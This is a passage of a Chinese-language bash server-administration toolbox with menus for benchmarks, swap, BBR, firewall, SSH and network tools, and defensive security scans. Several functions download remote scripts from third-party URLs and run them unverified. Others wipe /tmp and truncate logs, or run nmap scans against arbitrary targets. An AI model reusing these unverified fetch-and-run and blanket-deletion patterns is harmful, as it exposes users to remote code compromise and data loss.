        rm -f "$script_file"
        echo -e "${GREEN}YABS测试完成！${NC}"
        log_operation "运行YABS测试" "完成" "SUCCESS"
    else
        handle_error "YABS测试失败"
    fi
}

run_superspeed() {
    echo -e "${BOLD}运行三网测速${NC}"

    if ! confirm_action "运行三网测速？" "n"; then
        return
    fi

    echo -e "${CYAN}开始测速...${NC}"
    local script_file
    script_file=$(download_with_fallback "https://git.io/superspeed.sh")
    if [ $? -eq 0 ] && [ -n "$script_file" ]; then
        bash "$script_file"
        rm -f "$script_file"
        log_operation "运行三网测速" "完成" "INFO"
    else
        handle_error "下载测速脚本失败"
    fi
}

test_media_unlock() {
    echo -e "${BOLD}流媒体解锁检测${NC}"

    echo -e "${CYAN}下载检测脚本...${NC}"
    local script_file
    script_file=$(download_with_fallback "https://check.unlock.media")
    if [ $? -eq 0 ] && [ -n "$script_file" ]; then
        bash "$script_file"
        rm -f "$script_file"
        log_operation "流媒体解锁检测" "完成" "INFO"
    else
        handle_error "下载检测脚本失败"
    fi
}

test_disk_io() {
    echo -e "${BOLD}磁盘IO性能测试${NC}"

    echo "选择测试模式:"
    echo "1. 快速测试 (dd命令)"
    echo "2. 详细测试 (fio工具)"
    read -p "请选择: " io_choice

    case $io_choice in
        1)
            echo -e "${CYAN}快速DD测试...${NC}"
            echo -e "${YELLOW}写入测试:${NC}"
            dd if=/dev/zero of=./test_io bs=64k count=16k conv=fdatasync 2>&1 | tail -1
            echo -e "${YELLOW}读取测试:${NC}"
            dd if=./test_io of=/dev/null bs=64k 2>&1 | tail -1
            rm -f ./test_io
            ;;
        2)
            if ! command -v fio &> /dev/null; then
                echo -e "${YELLOW}安装fio工具...${NC}"
                eval "$PKG_INSTALL fio"
            fi
            echo -e "${CYAN}FIO详细测试...${NC}"
            fio --name=randwrite --ioengine=libaio --iodepth=32 --rw=randwrite --bs=4k --direct=1 --size=256M --numjobs=4 --runtime=60 --group_reporting
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "磁盘IO测试" "完成" "INFO"
}

test_trace_route() {
    echo -e "${BOLD}路由追踪测试${NC}"

    read -p "输入目标地址 (默认: google.com): " target
    target=${target:-"google.com"}

    echo -e "${CYAN}测试到 $target 的路由...${NC}"
    traceroute "$target"

    log_operation "路由追踪测试" "目标: $target" "INFO"
}

run_geekbench() {
    echo -e "${BOLD}运行Geekbench跑分${NC}"

    if ! confirm_action "Geekbench需要下载较大文件，确认继续？" "n"; then
        return
    fi

    echo -e "${CYAN}下载Geekbench...${NC}"
    local url
    if [ "$(uname -m)" = "x86_64" ]; then
        url="https://cdn.geekbench.com/Geekbench-5.4.6-Linux.tar.gz"
    else
        url="https://cdn.geekbench.com/Geekbench-5.4.6-LinuxARMPreview.tar.gz"
    fi

    if ! download_with_fallback "$url" "geekbench.tar.gz"; then
        handle_error "下载Geekbench失败"
        return
    fi

    tar -xzf geekbench.tar.gz
    cd Geekbench-* || exit 1

    echo -e "${CYAN}运行Geekbench...${NC}"
    ./geekbench5

    cd ..
    rm -rf Geekbench-* geekbench.tar.gz

    log_operation "运行Geekbench" "完成" "INFO"
}

# ==================== 系统工具模块 ====================
system_tools_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}系统工具${NC}"
        echo -e "${BLUE}1.${NC} 设置虚拟内存 Swap"
        echo -e "${BLUE}2.${NC} 更新系统软件"
        echo -e "${BLUE}3.${NC} BBR 加速"
        echo -e "${BLUE}4.${NC} 防火墙管理"
        echo -e "${BLUE}5.${NC} 修改SSH端口"
        echo -e "${BLUE}6.${NC} 系统健康检查"
        echo -e "${BLUE}7.${NC} 清理系统垃圾"
        echo -e "${BLUE}8.${NC} 查看系统信息"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        echo ""
        read -p "请选择操作: " choice

        case $choice in
            1) setup_swap ;;
            2) update_system ;;
            3) setup_bbr ;;
            4) firewall_management ;;
            5) change_ssh_port ;;
            6) system_health_check ;;
            7) clean_junk ;;
            8) show_system_info ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

setup_swap() {
    echo -e "${BOLD}设置虚拟内存 Swap${NC}"

    if ! confirm_action "创建Swap文件？" "n"; then
        return
    fi

    local current_swap=$(free -h | grep Swap | awk '{print $2}')
    if [ "$current_swap" != "0B" ] && [ "$current_swap" != "0" ]; then
        echo -e "${YELLOW}当前已存在Swap: $current_swap${NC}"
        if ! confirm_action "是否继续创建新的Swap？" "n"; then
            return
        fi
    fi

    read -p "输入Swap大小 (单位: GB, 默认: 2): " swap_size
    swap_size=${swap_size:-2}

    echo -e "${CYAN}创建 ${swap_size}GB 的Swap文件...${NC}"
    sudo fallocate -l ${swap_size}G /swapfile
    sudo chmod 600 /swapfile
    sudo mkswap /swapfile
    sudo swapon /swapfile

    echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab

    echo "vm.swappiness=10" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -p

    echo -e "${GREEN}Swap设置完成${NC}"
    free -h | grep -i swap
    log_operation "设置Swap" "大小: ${swap_size}GB" "SUCCESS"
}

update_system() {
    echo -e "${BOLD}更新系统软件${NC}"

    if ! confirm_action "更新系统软件？" "n"; then
        return
    fi

    echo -e "${CYAN}更新软件源...${NC}"
    eval "$PKG_UPDATE"

    echo -e "${CYAN}升级软件包...${NC}"
    case "$PKG_MANAGER" in
        apt)
            sudo apt upgrade -y
            sudo apt autoremove -y
            ;;
        yum)
            sudo yum update -y
            ;;
        dnf)
            sudo dnf upgrade -y
            sudo dnf autoremove -y
            ;;
        pacman)
            sudo pacman -Syu --noconfirm
            ;;
        *)
            echo -e "${YELLOW}不支持的包管理器${NC}"
            ;;
    esac

    echo -e "${GREEN}系统更新完成！${NC}"
    log_operation "更新系统" "完成" "SUCCESS"
}

setup_bbr() {
    echo -e "${BOLD}启用BBR加速${NC}"

    if ! confirm_action "启用BBR拥塞控制算法？" "n"; then
        return
    fi

    local kernel_version=$(uname -r | cut -d. -f1)
    if [ "$kernel_version" -lt 4 ]; then
        echo -e "${YELLOW}内核版本低于4.9，需要升级内核${NC}"
        if confirm_action "是否升级内核？" "n"; then
            upgrade_kernel
        else
            return
        fi
    fi

    echo -e "${CYAN}启用BBR...${NC}"
    sudo modprobe tcp_bbr
    echo "tcp_bbr" | sudo tee -a /etc/modules-load.d/modules.conf
    echo "net.core.default_qdisc=fq" | sudo tee -a /etc/sysctl.conf
    echo "net.ipv4.tcp_congestion_control=bbr" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -p

    local current_congestion=$(sysctl net.ipv4.tcp_congestion_control | awk '{print $3}')
    if [ "$current_congestion" = "bbr" ]; then
        echo -e "${GREEN}BBR已成功启用${NC}"
        log_operation "启用BBR" "成功" "SUCCESS"
    else
        echo -e "${YELLOW}BBR可能未正确启用${NC}"
    fi
}

upgrade_kernel() {
    echo -e "${CYAN}升级内核...${NC}"

    case "$OS_ID" in
        ubuntu|debian)
            sudo apt update
            sudo apt install -y --install-recommends linux-generic-hwe-16.04
            ;;
        centos)
            sudo yum install -y kernel kernel-devel
            ;;
        *)
            echo -e "${YELLOW}不支持的系统${NC}"
            return 1
            ;;
    esac

    echo -e "${GREEN}内核升级完成，需要重启生效${NC}"
}

firewall_management() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}防火墙管理${NC}"
        echo -e "${BLUE}1.${NC} 查看防火墙状态"
        echo -e "${BLUE}2.${NC} 开放端口"
        echo -e "${BLUE}3.${NC} 关闭端口"
        echo -e "${BLUE}4.${NC} 列出开放端口"
        echo -e "${BLUE}5.${NC} 重启防火墙"
        echo -e "${BLUE}0.${NC} 返回"
        echo ""
        read -p "请选择操作: " choice

        case $choice in
            1)
                if command -v ufw &> /dev/null; then
                    sudo ufw status verbose
                elif command -v firewall-cmd &> /dev/null; then
                    sudo firewall-cmd --state
                    sudo firewall-cmd --list-all
                else
                    sudo iptables -L -n -v
                fi
                ;;
            2)
                read -p "输入要开放的端口 (如: 22): " port
                read -p "输入协议 (tcp/udp, 默认: tcp): " protocol
                protocol=${protocol:-"tcp"}

                if command -v ufw &> /dev/null; then
                    sudo ufw allow $port/$protocol
                elif command -v firewall-cmd &> /dev/null; then
                    sudo firewall-cmd --permanent --add-port=$port/$protocol
                    sudo firewall-cmd --reload
                else
                    sudo iptables -A INPUT -p $protocol --dport $port -j ACCEPT
                    sudo service iptables save
                fi
                echo -e "${GREEN}端口 $port/$protocol 已开放${NC}"
                ;;
            3)
                read -p "输入要关闭的端口 (如: 22): " port
                read -p "输入协议 (tcp/udp, 默认: tcp): " protocol
                protocol=${protocol:-"tcp"}

                if command -v ufw &> /dev/null; then
                    sudo ufw deny $port/$protocol
                elif command -v firewall-cmd &> /dev/null; then
                    sudo firewall-cmd --permanent --remove-port=$port/$protocol
                    sudo firewall-cmd --reload
                else
                    sudo iptables -D INPUT -p $protocol --dport $port -j ACCEPT
                    sudo service iptables save
                fi
                echo -e "${GREEN}端口 $port/$protocol 已关闭${NC}"
                ;;
            4)
                if command -v ufw &> /dev/null; then
                    sudo ufw status numbered
                elif command -v firewall-cmd &> /dev/null; then
                    sudo firewall-cmd --list-ports
                else
                    sudo iptables -L -n --line-numbers
                fi
                ;;
            5)
                if command -v ufw &> /dev/null; then
                    sudo ufw disable && sudo ufw enable
                elif command -v firewall-cmd &> /dev/null; then
                    sudo systemctl restart firewalld
                else
                    sudo service iptables restart
                fi
                echo -e "${GREEN}防火墙已重启${NC}"
                ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac

        echo ""
        read -p "按回车键继续..."
    done
}

change_ssh_port() {
    echo -e "${BOLD}修改SSH端口${NC}"

    if ! confirm_action "修改SSH端口？" "n"; then
        return
    fi

    read -p "输入新的SSH端口 (1024-65535): " new_port

    if ! [[ "$new_port" =~ ^[0-9]+$ ]] || [ "$new_port" -lt 1024 ] || [ "$new_port" -gt 65535 ]; then
        echo -e "${RED}端口号无效${NC}"
        return
    fi

    sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup

    sudo sed -i "s/^#Port.*/Port $new_port/" /etc/ssh/sshd_config
    sudo sed -i "s/^Port.*/Port $new_port/" /etc/ssh/sshd_config

    if ! grep -q "^Port " /etc/ssh/sshd_config; then
        echo "Port $new_port" | sudo tee -a /etc/ssh/sshd_config
    fi

    sudo systemctl restart sshd || sudo service ssh restart

    echo -e "${GREEN}SSH端口已修改为 $new_port${NC}"
    echo -e "${YELLOW}请确保防火墙已开放新端口${NC}"

    log_operation "修改SSH端口" "新端口: $new_port" "SUCCESS"
}

system_health_check() {
    echo -e "${BOLD}系统健康检查${NC}"

    echo -e "${CYAN}1. 磁盘使用率:${NC}"
    df -h | grep -E '^/dev/'

    echo -e "\n${CYAN}2. 内存使用率:${NC}"
    free -h

    echo -e "\n${CYAN}3. CPU负载:${NC}"
    uptime

    echo -e "\n${CYAN}4. 关键服务状态:${NC}"
    local services=("sshd" "cron" "systemd-journald")
    for service in "${services[@]}"; do
        if systemctl is-active --quiet "$service"; then
            echo -e "${GREEN}✓${NC} $service 运行正常"
        else
            echo -e "${RED}✗${NC} $service 未运行"
        fi
    done

    echo -e "\n${CYAN}5. 最近登录:${NC}"
    last | head -10

    echo -e "\n${CYAN}6. 系统错误日志:${NC}"
    journalctl -p 3 -xb --no-pager | tail -20

    log_operation "系统健康检查" "完成" "INFO"
}

clean_junk() {
    echo -e "${BOLD}清理系统垃圾${NC}"

    if ! confirm_action "清理系统垃圾？" "n"; then
        return
    fi

    echo -e "${CYAN}清理APT缓存...${NC}"
    sudo apt autoclean 2>/dev/null || true
    sudo apt autoremove -y 2>/dev/null || true

    echo -e "${CYAN}清理YUM/DNF缓存...${NC}"
    sudo yum clean all 2>/dev/null || true
    sudo dnf clean all 2>/dev/null || true

    echo -e "${CYAN}清理临时文件...${NC}"
    sudo rm -rf /tmp/*
    sudo rm -rf /var/tmp/*

    echo -e "${CYAN}清理日志文件...${NC}"
    sudo find /var/log -type f -name "*.log" -size +10M -exec truncate -s 0 {} \; 2>/dev/null || true

    echo -e "${CYAN}清理缩略图缓存...${NC}"
    rm -rf ~/.cache/thumbnails/*

    echo -e "${GREEN}系统垃圾清理完成！${NC}"
    log_operation "清理系统垃圾" "完成" "SUCCESS"
}

show_system_info() {
    echo -e "${BOLD}系统信息${NC}"

    echo -e "${CYAN}1. 操作系统:${NC}"
    lsb_release -a 2>/dev/null || cat /etc/os-release

    echo -e "\n${CYAN}2. 内核版本:${NC}"
    uname -a

    echo -e "\n${CYAN}3. CPU信息:${NC}"
    lscpu | grep -E "Model name|CPU\(s\)|Thread|MHz"

    echo -e "\n${CYAN}4. 内存信息:${NC}"
    free -h

    echo -e "\n${CYAN}5. 磁盘信息:${NC}"
    df -h

    echo -e "\n${CYAN}6. 网络信息:${NC}"
    ip addr show | grep -E "inet |ether"

    echo -e "\n${CYAN}7. 运行时间:${NC}"
    uptime -p

    echo -e "\n${CYAN}8. 当前用户:${NC}"
    whoami

    echo -e "\n${CYAN}9. 登录用户:${NC}"
    who

    log_operation "查看系统信息" "完成" "INFO"
}

# ==================== 网络工具模块 ====================
network_tools_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}网络工具${NC}"
        echo -e "${BLUE}1.${NC} 端口扫描"
        echo -e "${BLUE}2.${NC} 网速测试"
        echo -e "${BLUE}3.${NC} 路由追踪"
        echo -e "${BLUE}4.${NC} 查看连接"
        echo -e "${BLUE}5.${NC} DNS查询"
        echo -e "${BLUE}6.${NC} IP信息查询"
        echo -e "${BLUE}7.${NC} 网络接口信息"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        echo ""
        read -p "请选择操作: " choice

        case $choice in
            1) port_scan ;;
            2) speed_test ;;
            3) trace_route ;;
            4) view_connections ;;
            5) dns_query ;;
            6) ip_info ;;
            7) network_interface_info ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

port_scan() {
    echo -e "${BOLD}端口扫描${NC}"

    read -p "输入目标IP或域名: " target
    if [ -z "$target" ]; then
        target="localhost"
    fi

    echo "选择扫描类型:"
    echo "1. 常用端口扫描"
    echo "2. 快速扫描"
    echo "3. 详细扫描"
    read -p "请选择: " scan_type

    case $scan_type in
        1)
            echo -e "${CYAN}扫描常用端口...${NC}"
            nc -zv "$target" 21 22 23 25 53 80 110 143 443 465 587 993 995 3306 3389 5432 8080 2>/dev/null || true
            ;;
        2)
            echo -e "${CYAN}快速扫描...${NC}"
            if command -v nmap &> /dev/null; then
                sudo nmap -F "$target"
            else
                echo -e "${YELLOW}安装nmap...${NC}"
                eval "$PKG_INSTALL nmap"
                sudo nmap -F "$target"
            fi
            ;;
        3)
            echo -e "${CYAN}详细扫描...${NC}"
            if command -v nmap &> /dev/null; then
                sudo nmap -sS -sV -O "$target"
            else
                echo -e "${YELLOW}安装nmap...${NC}"
                eval "$PKG_INSTALL nmap"
                sudo nmap -sS -sV -O "$target"
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "端口扫描" "目标: $target" "INFO"
}

speed_test() {
    echo -e "${BOLD}网速测试${NC}"

    echo "选择测试方式:"
    echo "1. Speedtest-cli"
    echo "2. iPerf3 (需要服务器)"
    echo "3. 本地网卡速度"
    read -p "请选择: " test_type

    case $test_type in
        1)
            if ! command -v speedtest-cli &> /dev/null; then
                echo -e "${YELLOW}安装speedtest-cli...${NC}"
                eval "$PKG_INSTALL speedtest-cli"
            fi
            echo -e "${CYAN}开始测速...${NC}"
            speedtest-cli
            ;;
        2)
            read -p "输入iPerf3服务器地址 (默认: iperf.he.net): " iperf_server
            iperf_server=${iperf_server:-"iperf.he.net"}
            if ! command -v iperf3 &> /dev/null; then
                echo -e "${YELLOW}安装iperf3...${NC}"
                eval "$PKG_INSTALL iperf3"
            fi
            echo -e "${CYAN}连接到 $iperf_server...${NC}"
            iperf3 -c "$iperf_server"
            ;;
        3)
            echo -e "${CYAN}网卡信息:${NC}"
            for iface in $(ls /sys/class/net/ | grep -v lo); do
                speed=$(cat /sys/class/net/$iface/speed 2>/dev/null || echo "未知")
                duplex=$(cat /sys/class/net/$iface/duplex 2>/dev/null || echo "未知")
                echo "$iface: ${speed}Mbps $duplex"
            done
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "网速测试" "完成" "INFO"
}

trace_route() {
    echo -e "${BOLD}路由追踪${NC}"

    read -p "输入目标地址 (默认: google.com): " target
    target=${target:-"google.com"}

    echo "选择追踪方式:"
    echo "1. traceroute (默认)"
    echo "2. mtr (更详细)"
    read -p "请选择: " trace_type

    case $trace_type in
        1|"")
            if command -v traceroute &> /dev/null; then
                traceroute "$target"
            else
                echo -e "${YELLOW}安装traceroute...${NC}"
                eval "$PKG_INSTALL traceroute"
                traceroute "$target"
            fi
            ;;
        2)
            if command -v mtr &> /dev/null; then
                mtr -r "$target"
            else
                echo -e "${YELLOW}安装mtr...${NC}"
                eval "$PKG_INSTALL mtr"
                mtr -r "$target"
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "路由追踪" "目标: $target" "INFO"
}

view_connections() {
    echo -e "${BOLD}查看网络连接${NC}"

    echo "选择查看方式:"
    echo "1. 所有连接"
    echo "2. 监听端口"
    echo "3. 按进程查看"
    read -p "请选择: " view_type

    case $view_type in
        1)
            echo -e "${CYAN}所有网络连接:${NC}"
            ss -tunap
            ;;
        2)
            echo -e "${CYAN}监听端口:${NC}"
            ss -tulnp
            ;;
        3)
            echo -e "${CYAN}按进程查看:${NC}"
            sudo lsof -i -P -n
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "查看网络连接" "完成" "INFO"
}

dns_query() {
    echo -e "${BOLD}DNS查询${NC}"

    read -p "输入要查询的域名: " domain

    if [ -z "$domain" ]; then
        echo -e "${RED}域名不能为空${NC}"
        return
    fi

    echo "选择查询类型:"
    echo "1. A记录 (IPv4)"
    echo "2. AAAA记录 (IPv6)"
    echo "3. MX记录 (邮件服务器)"
    echo "4. NS记录 (域名服务器)"
    echo "5. TXT记录"
    echo "6. CNAME记录"
    echo "7. 所有记录"
    read -p "请选择: " query_type

    case $query_type in
        1) record_type="A" ;;
        2) record_type="AAAA" ;;
        3) record_type="MX" ;;
        4) record_type="NS" ;;
        5) record_type="TXT" ;;
        6) record_type="CNAME" ;;
        7) record_type="ANY" ;;
        *) record_type="A" ;;
    esac

    echo -e "${CYAN}查询 $domain 的 $record_type 记录...${NC}"

    if command -v dig &> /dev/null; then
        dig "$domain" "$record_type" +short
        echo -e "\n${CYAN}详细结果:${NC}"
        dig "$domain" "$record_type"
    elif command -v nslookup &> /dev/null; then
        nslookup -type="$record_type" "$domain"
    else
        echo -e "${YELLOW}安装dig工具...${NC}"
        eval "$PKG_INSTALL dnsutils"
        dig "$domain" "$record_type"
    fi

    log_operation "DNS查询" "域名: $domain, 类型: $record_type" "INFO"
}

ip_info() {
    echo -e "${BOLD}IP信息查询${NC}"

    echo "选择查询方式:"
    echo "1. 查询本机公网IP"
    echo "2. 查询指定IP信息"
    echo "3. 查询本机所有IP"
    read -p "请选择: " info_type

    case $info_type in
        1)
            echo -e "${CYAN}公网IPv4:${NC}"
            curl -4 ifconfig.me 2>/dev/null || echo "获取失败"
            echo -e "\n${CYAN}公网IPv6:${NC}"
            curl -6 ifconfig.me 2>/dev/null || echo "获取失败"
            ;;
        2)
            read -p "输入IP地址: " ip_address
            if [ -z "$ip_address" ]; then
                echo -e "${RED}IP地址不能为空${NC}"
                return
            fi
            echo -e "${CYAN}查询 $ip_address 的信息...${NC}"
            curl -s "http://ip-api.com/json/$ip_address?lang=zh-CN" | python3 -m json.tool 2>/dev/null || \
            curl -s "http://ip-api.com/json/$ip_address"
            ;;
        3)
            echo -e "${CYAN}本机所有IP地址:${NC}"
            ip addr show | grep -E "inet |inet6 " | awk '{print $2}'
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "IP信息查询" "完成" "INFO"
}

network_interface_info() {
    echo -e "${BOLD}网络接口信息${NC}"

    echo -e "${CYAN}1. 网络接口列表:${NC}"
    ip link show

    echo -e "\n${CYAN}2. IP地址配置:${NC}"
    ip addr show

    echo -e "\n${CYAN}3. 路由表:${NC}"
    ip route show

    echo -e "\n${CYAN}4. ARP表:${NC}"
    ip neigh show

    echo -e "\n${CYAN}5. 网络统计:${NC}"
    netstat -i

    log_operation "网络接口信息" "完成" "INFO"
}

# ==================== 安全工具模块 ====================
security_tools_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}安全工具${NC}"
        echo -e "${RED}注意: 请遵守法律法规${NC}\n"
        echo -e "${BLUE}1.${NC} SSH安全检测"
        echo -e "${BLUE}2.${NC} 端口安全扫描"
        echo -e "${BLUE}3.${NC} 恶意软件扫描"
        echo -e "${BLUE}4.${NC} 文件完整性检查"
        echo -e "${BLUE}5.${NC} 系统漏洞扫描"
        echo -e "${BLUE}6.${NC} 密码强度检查"
        echo -e "${BLUE}7.${NC} 防火墙规则检查"
        echo -e "${BLUE}8.${NC} 安全日志分析"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        read -p "请选择: " choice

        case $choice in
            1) ssh_security_check ;;
            2) port_security_scan ;;
            3) malware_scan ;;
            4) file_integrity_check ;;
            5) vulnerability_scan ;;
            6) password_strength_check ;;
            7) firewall_rules_check ;;
            8) security_log_analysis ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac

        echo ""
        read -p "按回车键继续..."
    done
}

ssh_security_check() {
    echo -e "${BOLD}SSH安全检测${NC}"

    echo -e "${CYAN}1. 检查SSH配置文件...${NC}"
    echo -e "${YELLOW}SSH配置摘要:${NC}"
    grep -E "^(Port|PermitRootLogin|PasswordAuthentication|Protocol)" /etc/ssh/sshd_config 2>/dev/null || echo "未找到SSH配置文件"

    echo -e "\n${CYAN}2. 检查SSH登录失败记录...${NC}"
    sudo grep "Failed password" /var/log/auth.log 2>/dev/null | tail -10 || \
    sudo grep "Failed password" /var/log/secure 2>/dev/null | tail -10 || \
    echo "未找到登录失败记录"

    echo -e "\n${CYAN}3. 检查最近成功登录...${NC}"
    last | head -10

    echo -e "\n${CYAN}4. 检查SSH密钥...${NC}"
    ls -la ~/.ssh/ 2>/dev/null || echo "未找到.ssh目录"

    echo -e "\n${YELLOW}安全建议:${NC}"
    echo "1. 禁用root直接登录 (PermitRootLogin no)"
    echo "2. 使用密钥认证代替密码"
    echo "3. 修改默认SSH端口"
    echo "4. 使用强密码策略"
    echo "5. 限制IP访问 (AllowUsers/AllowGroups)"

    log_operation "SSH安全检测" "完成" "INFO"
}

port_security_scan() {
    echo -e "${BOLD}端口安全扫描${NC}"

    echo -e "${CYAN}扫描本机开放端口...${NC}"

    if command -v netstat &> /dev/null; then
        echo -e "${YELLOW}netstat结果:${NC}"
        sudo netstat -tulnp
    elif command -v ss &> /dev/null; then
        echo -e "${YELLOW}ss结果:${NC}"
        sudo ss -tulnp
    else
        eval "$PKG_INSTALL net-tools"
        sudo netstat -tulnp
    fi

    echo -e "\n${YELLOW}安全建议:${NC}"
    echo "1. 关闭不必要的端口"
    echo "2. 使用防火墙限制访问"
    echo "3. 定期检查端口状态"
    echo "4. 监控网络连接"

    log_operation "端口安全扫描" "完成" "INFO"
}

malware_scan() {
    echo -e "${BOLD}恶意软件扫描${NC}"

    echo "选择扫描工具:"
    echo "1. ClamAV (反病毒)"
    echo "2. Rkhunter (Rootkit检测)"
    echo "3. Chkrootkit (Rootkit检测)"
    echo "4. Lynis (安全审计)"
    read -p "请选择: " scan_tool

    case $scan_tool in
        1)
            if ! command -v clamscan &> /dev/null; then
                echo -e "${YELLOW}安装ClamAV...${NC}"
                eval "$PKG_INSTALL clamav"
            fi
            echo -e "${CYAN}更新病毒库...${NC}"
            sudo freshclam
            echo -e "${CYAN}扫描系统关键目录...${NC}"
            sudo clamscan -r --bell -i /etc /bin /usr/bin /sbin /usr/sbin
            ;;
        2)
            if ! command -v rkhunter &> /dev/null; then
                echo -e "${YELLOW}安装Rkhunter...${NC}"
                eval "$PKG_INSTALL rkhunter"
            fi
            echo -e "${CYAN}更新数据库...${NC}"
            sudo rkhunter --update
            echo -e "${CYAN}进行系统检查...${NC}"
            sudo rkhunter --check
            ;;
        3)
            if ! command -v chkrootkit &> /dev/null; then
                echo -e "${YELLOW}安装Chkrootkit...${NC}"
                eval "$PKG_INSTALL chkrootkit"
            fi
            echo -e "${CYAN}扫描Rootkit...${NC}"
            sudo chkrootkit
            ;;
        4)
            if ! command -v lynis &> /dev/null; then
                echo -e "${YELLOW}安装Lynis...${NC}"
                case "$PKG_MANAGER" in
                    apt) sudo apt install -y lynis ;;
                    yum|dnf) sudo yum install -y lynis ;;
                    *) echo "请手动安装Lynis" ;;
                esac
            fi
            echo -e "${CYAN}运行系统审计...${NC}"
            sudo lynis audit system
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "恶意软件扫描" "工具: $scan_tool" "INFO"
}

file_integrity_check() {
    echo -e "${BOLD}文件完整性检查${NC}"

    echo "选择检查方式:"
    echo "1. 检查系统关键文件"
    echo "2. 计算文件哈希值"
    echo "3. 检查文件权限"
    read -p "请选择: " check_type

    case $check_type in
        1)
            echo -e "${CYAN}检查系统关键文件...${NC}"
            local critical_files=(
                "/etc/passwd"
                "/etc/shadow"
                "/etc/group"
                "/etc/sudoers"
                "/etc/ssh/sshd_config"
                "/etc/hosts"
                "/etc/resolv.conf"
            )
            for file in "${critical_files[@]}"; do
                if [ -f "$file" ]; then
                    perms=$(stat -c "%a %U %G" "$file")
                    echo "$file: $perms"
                fi
            done
            ;;
        2)
            read -p "输入要计算哈希的文件路径: " file_path
            if [ -f "$file_path" ]; then
                echo -e "${CYAN}计算哈希值...${NC}"
                echo "MD5:    $(md5sum "$file_path" | awk '{print $1}')"
                echo "SHA1:   $(sha1sum "$file_path" | awk '{print $1}')"
                echo "SHA256: $(sha256sum "$file_path" | awk '{print $1}')"
            else
                echo -e "${RED}文件不存在${NC}"
            fi
            ;;
        3)
            echo -e "${CYAN}检查敏感文件权限...${NC}"
            find /etc -type f -perm /o+w -ls 2>/dev/null | head -20
            echo -e "\n${YELLOW}可写的配置文件可能存在安全风险${NC}"
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "文件完整性检查" "类型: $check_type" "INFO"
}

vulnerability_scan() {
    echo -e "${BOLD}系统漏洞扫描${NC}"

    echo -e "${CYAN}检查已知漏洞...${NC}"

    echo -e "${YELLOW}内核版本:${NC}"
    uname -r

    echo -e "\n${YELLOW}服务版本:${NC}"
    for service in sshd nginx apache2 mysql postgresql; do
        if command -v $service &> /dev/null || systemctl is-active --quiet $service; then
            version=$($service --version 2>/dev/null | head -1)
            echo "$service: $version"
        fi
    done

    echo -e "\n${YELLOW}可更新的软件包:${NC}"
    case "$PKG_MANAGER" in
        apt) sudo apt list --upgradable 2>/dev/null | head -20 ;;
        yum) sudo yum check-update 2>/dev/null | head -20 ;;
        dnf) sudo dnf check-update 2>/dev/null | head -20 ;;
    esac

    echo -e "\n${YELLOW}安全建议:${NC}"
    echo "1. 定期更新系统和软件包"
    echo "2. 关注安全公告"
    echo "3. 使用最小化安装"
    echo "4. 及时应用安全补丁"

    log_operation "系统漏洞扫描" "完成" "INFO"
}

password_strength_check() {
    echo -e "${BOLD}密码强度检查${NC}"

    echo -e "${YELLOW}注意: 此功能仅检查密码策略${NC}"

    echo -e "${CYAN}密码策略检查:${NC}"

    if [ -f /etc/pam.d/common-password ]; then
        echo -e "${YELLOW}PAM配置:${NC}"
        grep -E "minlen|difok|ucredit|lcredit|dcredit|ocredit" /etc/pam.d/common-password
    fi

    if [ -f /etc/login.defs ]; then
        echo -e "\n${YELLOW}登录配置:${NC}"
        grep -E "PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE" /etc/login.defs
    fi

    echo -e "\n${YELLOW}用户密码状态:${NC}"
    echo "用户名 | 密码最后修改 | 密码过期"
    echo "--------------------------------"
    while IFS=: read -r user _ uid gid _ home shell; do
        if [ "$uid" -ge 1000 ] || [ "$uid" -eq 0 ]; then
            passwd_info=$(chage -l "$user" 2>/dev/null | grep "Last password change\|Password expires")
            if [ $? -eq 0 ]; then
                echo "$user | $(echo "$passwd_info" | head -1 | cut -d: -f2-)"
            fi
        fi
    done < /etc/passwd | head -10

    echo -e "\n${YELLOW}密码强度建议:${NC}"
    echo "1. 密码长度至少12位"
    echo "2. 包含大小写字母、数字、特殊字符"
    echo "3. 定期更换密码"
    echo "4. 不要使用常见密码"

    log_operation "密码强度检查" "完成" "INFO"
}

firewall_rules_check() {
    echo -e "${BOLD}防火墙规则检查${NC}"

    echo -e "${CYAN}检查防火墙状态...${NC}"

    if command -v ufw &> /dev/null; then
        echo -e "${YELLOW}UFW防火墙:${NC}"
        sudo ufw status verbose
    elif command -v firewall-cmd &> /dev/null; then
        echo -e "${YELLOW}FirewallD:${NC}"
        sudo firewall-cmd --state
        sudo firewall-cmd --list-all
    else
        echo -e "${YELLOW}iptables:${NC}"
        sudo iptables -L -n -v
    fi

    echo -e "\n${CYAN}检查默认策略...${NC}"
    if command -v iptables &> /dev/null; then
        echo "INPUT链默认策略: $(sudo iptables -L INPUT | grep policy | awk '{print $4}')"
